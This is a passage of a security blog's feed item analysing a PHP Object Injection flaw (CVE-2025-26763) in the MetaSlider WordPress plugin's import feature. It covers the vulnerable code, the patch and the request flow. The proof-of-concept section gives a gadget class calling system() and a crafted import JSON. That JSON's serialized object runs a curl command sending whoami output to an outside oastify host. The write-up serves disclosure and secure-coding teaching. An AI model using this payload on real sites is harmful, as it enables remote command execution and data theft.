id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.94.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; function is called directly on user-controlled data (&lt;code&gt;$value&lt;/code&gt;). Since these values are not validated before being unserialized, an attacker can inject malicious serialized payloads leading to PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v3.95.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#34; title=&#34;Patch diff&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch diff&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#39; alt=&#34;Diff&#34; height=&#34;406&#34; width=&#34;1885&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch diff&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch adds two critical protections to prevent malicious data from being unserialized:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Block any meta value that is a serialized object (O:). If detected, the import process stops and the slideshow is deleted.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($slideshow[&amp;#39;meta&amp;#39;]) &amp;amp;&amp;amp; is_array($slideshow[&amp;#39;meta&amp;#39;])) {&#xA;    foreach ($slideshow[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;&#xA;        // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON&#xA;        if ( is_serialized( $value ) &amp;amp;&amp;amp; substr( trim( $value ), 0, 2 ) === &amp;#39;O:&amp;#39; ) {&#xA;            wp_trash_post($new_slideshow_id);&#xA;&#xA;            return new WP_Error(&#xA;                &amp;#39;import_slideshow_error&amp;#39;,&#xA;                esc_html__( &amp;#39;Import file is invalid.&amp;#39;, &amp;#39;ml-slider&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        update_post_meta(&#xA;            $new_slideshow_id,&#xA;            $key,&#xA;            $this-&amp;gt;maybe_unserialize(str_replace(&amp;#39;{#ID#}&amp;#39;, $new_slideshow_id, $value))&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Replace &lt;code&gt;maybe_unserialize()&lt;/code&gt; with a safer version using &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt; to &lt;strong&gt;prevent object creation&lt;/strong&gt; during unserialization.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybe_unserialize( $data ) {&#xA;    if ( is_serialized( $data ) ) { // Don&amp;#39;t attempt to unserialize data that wasn&amp;#39;t serialized going in.&#xA;        return @unserialize( trim( $data ), array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This eliminates the PHP Object Injection risk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a POST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;metaslider/v1&amp;#39;;&#xA;register_rest_route($this-&amp;gt;namespace, &amp;#39;/slideshow/import&amp;#39;, array(array(&#xA;    &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;    &amp;#39;callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;import_slideshows&amp;#39;),&#xA;    &amp;#39;permission_callback&amp;#39; =&amp;gt; array($this-&amp;gt;api, &amp;#39;can_access&amp;#39;)&#xA;)));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;with callback &lt;code&gt;import_slideshows&lt;/code&gt; and permission validated via &lt;code&gt;can_access()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const DEFAULT_CAPABILITY_EDIT_SLIDES = &amp;#39;edit_others_posts&amp;#39;;&#xA;public function can_access()&#xA;{&#xA;    $capability = apply_filters(&amp;#39;metaslider_capability&amp;#39;, MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES);&#xA;&#xA;    // Check for the nonce on the server (used by WP REST)&#xA;    if (isset($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_SERVER[&amp;#39;HTTP_X_WP_NONCE&amp;#39;]), &amp;#39;wp_rest&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    // This is for when not using Axios (example: callout.php)&#xA;    if (isset($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_key($_REQUEST[&amp;#39;METASLIDER_NONCE&amp;#39;]), &amp;#39;metaslider_request&amp;#39;)) {&#xA;        return current_user_can($capability);&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function only allows users with &lt;code&gt;edit_others_posts&lt;/code&gt; capability (Editor or higher) to call the API.&lt;/p&gt;&#xA;&lt;p&gt;It validates in two ways:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;If the &lt;code&gt;X-WP-Nonce&lt;/code&gt; header exists, the plugin verifies the &lt;code&gt;&#39;wp_rest&#39;&lt;/code&gt; nonce and checks the capability.&lt;/li&gt;&#xA;&lt;li&gt;If the &lt;code&gt;METASLIDER_NONCE&lt;/code&gt; parameter exists, the plugin verifies the &lt;code&gt;&#39;metaslider_request&#39;&lt;/code&gt; nonce and checks the capability.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;If neither is valid, API access is denied.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_slideshows($request)&#xA;{&#xA;    if (!$this-&amp;gt;can_access()) {&#xA;        $this-&amp;gt;deny_access();&#xA;    }&#xA;&#xA;    $data = $this-&amp;gt;get_request_data($request, array(&amp;#39;slideshows&amp;#39;));&#xA;&#xA;    if (!$data[&amp;#39;slideshows&amp;#39;]) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __(&amp;#39;Nothing to import.&amp;#39;, &amp;#39;ml-slider&amp;#39;)&#xA;        ), 400);&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;slideshows-&amp;gt;import((array) json_decode($data[&amp;#39;slideshows&amp;#39;], true));&#xA;&#xA;    if (is_wp_error($status)) {&#xA;        wp_send_json_error(array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message()&#xA;        ), 400);&#xA;    }&#xA;&#xA;    wp_send_json_success($status, 200);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;import_slideshows()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Permission check&lt;/strong&gt; – if &lt;code&gt;can_access()&lt;/code&gt; returns false → block via &lt;code&gt;deny_access()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extract input data&lt;/strong&gt; – get the &lt;code&gt;slideshows&lt;/code&gt; field; if empty → return “Nothing to import”.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;JSON decode and import&lt;/strong&gt; – decode &lt;code&gt;slideshows&lt;/code&gt; and call &lt;code&gt;$this-&amp;gt;slideshows-&amp;gt;import()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Error handling&lt;/strong&gt; – if &lt;code&gt;WP_Error&lt;/code&gt; returned → send JSON error.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Success&lt;/strong&gt; – if no error → send JSON success with import result.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;According to &lt;code&gt;import()&lt;/code&gt;, &lt;code&gt;$slideshows&lt;/code&gt; is the exported data from &lt;strong&gt;created slideshows&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;/**&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Will import slideshows&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@param array $slideshows - The data generated by the export method&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;@throws Exception - handled within method.&lt;/li&gt;&#xA;&lt;li&gt;@return WP_Error|array - True on success, WP_Error on failure&#xA;*/&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;foreach ($slideshows as $index =&amp;gt; $slideshow) {&#xA;    ...&#xA;    foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide) {&#xA;        ...&#xA;        foreach ($slide[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value) {&#xA;            $value = $this-&amp;gt;restore_image_urls_from_string($value);&#xA;            add_post_meta($new_slide_id, $key, maybe_unserialize($value));&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;import()&lt;/code&gt; function loops through each slideshow, then each slide, then each meta. Each meta value is restored using &lt;code&gt;$this-&amp;gt;restore_image_urls_from_string($value)&lt;/code&gt; and stored with &lt;code&gt;add_post_meta($new_slide_id, $key, maybe_unserialize($value))&lt;/code&gt;. In other words, the code imports the entire slideshow, slides, and meta while processing image URLs and unserializing data before saving to the database.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Editor sends POST request → /metaslider/v1/slideshow/import&amp;#34;] --&amp;gt; B[&amp;#34;import_slideshows() invoked&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;can_access(): verify nonce &amp;#43; &amp;#39;edit_others_posts&amp;#39; capability&amp;#34;}&#xA;C -- Fail --&amp;gt; Z[&amp;#34;deny_access()&amp;#34;]&#xA;C -- Pass --&amp;gt; D[&amp;#34;Extract &amp;#39;slideshows&amp;#39; from request&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;json_decode(slideshows) → array of slideshow data&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;slideshows-&amp;gt;import() begins&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;foreach ($slideshows as $slideshow)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;foreach ($slideshow[&amp;#39;slides&amp;#39;] as $slide)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;foreach ($slide[&amp;#39;meta&amp;#39;] as key =&amp;gt; value)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;value = restore_image_urls_from_string(value)&amp;#34;]&#xA;J --&amp;gt; K{&amp;#34;Is value serialized?&amp;#34;}&#xA;&#xA;K -- Yes --&amp;gt; L[&amp;#34;maybe_unserialize(value)&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Store meta normally&amp;#34;]&#xA;&#xA;L --&amp;gt; N{&amp;#34;Does unserialize create an object?&amp;#34;}&#xA;N -- Yes --&amp;gt; R[&amp;#34;Object Injection → POP chain execution&amp;#34;]&#xA;N -- No --&amp;gt; M&#xA;&#xA;M --&amp;gt; O[&amp;#34;add_post_meta(new_slide_id, key, value)&amp;#34;]&#xA;O --&amp;gt; P[&amp;#34;Import continues for remaining slideshows&amp;#34;]&#xA;&#xA;R --&amp;gt; Q[&amp;#34;Exploit achieved&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Create any slideshow, export to get a sample JSON file.&lt;/li&gt;&#xA;&lt;li&gt;Modify the JSON file so that the &lt;code&gt;ml-slider_type&lt;/code&gt; field (or any iterated field) contains a serialized string.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;0&amp;#34;: {&#xA;    &amp;#34;title&amp;#34;: &amp;#34;New Slideshow&amp;#34;,&#xA;    &amp;#34;original_id&amp;#34;: 260,&#xA;    &amp;#34;meta&amp;#34;: {&#xA;      &amp;#34;metaslider_slideshow_theme&amp;#34;: &amp;#34;a:6:{s:6:\&amp;#34;folder\&amp;#34;;s:12:\&amp;#34;default-base\&amp;#34;;s:5:\&amp;#34;title\&amp;#34;;s:4:\&amp;#34;Base\&amp;#34;;s:4:\&amp;#34;type\&amp;#34;;s:4:\&amp;#34;free\&amp;#34;;s:8:\&amp;#34;supports\&amp;#34;;a:1:{i:0;s:4:\&amp;#34;flex\&amp;#34;;}s:4:\&amp;#34;tags\&amp;#34;;a:0:{}s:11:\&amp;#34;description\&amp;#34;;s:37:\&amp;#34;This is the default MetaSlider theme.\&amp;#34;;}&amp;#34;,&#xA;      &amp;#34;ml-slider_settings&amp;#34;: &amp;#34;...&amp;#34;&#xA;    },&#xA;    &amp;#34;slides&amp;#34;: [&#xA;      {&#xA;        &amp;#34;original_id&amp;#34;: 265,&#xA;        &amp;#34;order&amp;#34;: 0,&#xA;        &amp;#34;post_excerpt&amp;#34;: &amp;#34;&amp;#34;,&#xA;        &amp;#34;image&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;image_alt&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;meta&amp;#34;: {&#xA;          &amp;#34;ml-slider_type&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/9blonkz57zyrp69hwuz5tw0uoluci26r.oastify.com?leadked=$(whoami)\&amp;#34;;}&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_title&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_alt&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_crop_position&amp;#34;: &amp;#34;center-center&amp;#34;,&#xA;          &amp;#34;ml-slider_caption_source&amp;#34;: &amp;#34;image-caption&amp;#34;,&#xA;          &amp;#34;_wp_attachment_image_alt&amp;#34;: &amp;#34;&amp;#34;&#xA;        }&#xA;      }&#xA;    ]&#xA;  },&#xA;  &amp;#34;metadata&amp;#34;: {&#xA;    &amp;#34;version&amp;#34;: &amp;#34;3.94.0&amp;#34;,&#xA;    &amp;#34;date&amp;#34;: &amp;#34;2025/11/26&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Re-import the modified JSON file.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#39; alt=&#34;Result&#34; height=&#34;575&#34; width=&#34;1042&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs because the plugin calls &lt;code&gt;maybe_unserialize()&lt;/code&gt; directly on imported data without validation, allowing injection of malicious serialized payloads that lead to PHP Object Injection. Version 3.95.0 fixes this by blocking serialized objects and using a safer unserialize function.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never unserialize user-controlled data without validation.&lt;/li&gt;&#xA;&lt;li&gt;Import/export features are always sensitive attack surfaces.&lt;/li&gt;&#xA;&lt;li&gt;Serialized data (especially starting with &lt;code&gt;O:&lt;/code&gt;) must be controlled.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt; to prevent object creation during unserialize.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ml-slider/vulnerability/wordpress-slider-gallery-and-carousel-by-metaslider-image-slider-video-slider-plugin-3-94-0-php-object-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin &amp;lt;= 3.94.0 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3439 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-25-cve-2025-3439/</link>
      <pubDate>Tue, 25 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-25-cve-2025-3439/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
